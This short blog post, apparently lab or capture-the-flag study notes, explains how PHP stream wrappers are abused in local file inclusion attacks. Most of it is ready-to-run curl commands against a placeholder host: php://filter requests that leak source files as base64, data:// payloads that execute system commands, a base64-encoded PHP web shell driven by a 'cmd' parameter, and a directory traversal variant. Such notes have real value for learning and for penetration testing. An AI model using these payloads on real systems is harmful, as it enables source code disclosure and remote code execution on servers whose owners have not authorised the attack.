---
layout: post
title: Web App PHP Wrappers
titledate: 08/29/23
tags: ["infosec","offsec", "web", "lfi", "exploit", "php"]
---

<h4>PHP Wrappers</h4>

There are many php wrappers that can be used to bypass filters display file contents and obtain code execution

If we are trying to obtain more information about a php page perhaps we can use the php://filter wrapper

    $ curl http://vulnapp.com/home/index.php?page=php://filter/resource=admin.php

our content may be blocked so we can pass encoding options to filter

    $ curl http://vulnapp.com/home/index.php?page=php://filter/convert.base64-encode/resource=admin.php

the filter wrapper displays the file contents and the data wrapper can execute code

    $ curl "http://vulnapp.com/home/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

as in the above filter wrapper example we may need to encode our command we pass to the data wrapper

    $ curl "http://vulnapp.com/home/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

if we are using this in conjunction with a dir traversal it could look like

    $ curl http://vulnapp.com/home/index.php?page=php://filter/convert.base64-encode/resource=admin.php../../../../../../../../var/www/server/page.php

<h3>LOG ALL FLAGS BEFORE TURNING OFF MACHINE OR VPN</h3>
